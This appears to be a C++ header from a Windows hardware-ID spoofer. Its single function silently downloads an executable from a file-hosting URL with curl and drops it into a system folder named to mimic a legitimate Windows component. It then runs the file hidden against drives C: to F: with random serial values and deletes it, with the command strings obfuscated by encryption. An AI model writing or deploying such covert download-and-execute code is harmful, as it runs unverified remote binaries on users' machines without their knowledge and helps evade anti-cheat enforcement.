#pragma once
#include <processthreadsapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <WinUser.h>
#include <WinBase.h>
#include "skcrypt.h"
#include "randomizer.h"
#include "crypted_system.h"

void Volume() {
	system(Encrypt("curl --silent https://files.catbox.moe/991gz5 --output C:\\Windows\\GameBarPresenceWriter\\Disk1.exe >nul").decrypt());

	ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe C: ").decrypt() + RandomDisk(4) + "-" + RandomDisk(4)).c_str());
	ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe D: ").decrypt() + RandomDisk(4) + "-" + RandomDisk(4)).c_str());
	ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe E: ").decrypt() + RandomDisk(4) + "-" + RandomDisk(4)).c_str());
	ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Disk1.exe F: ").decrypt() + RandomDisk(4) + "-" + RandomDisk(4)).c_str());
	ExecuteCommandHidden(("del C:\\Windows\\GameBarPresenceWriter\\Disk1.exe"));


}
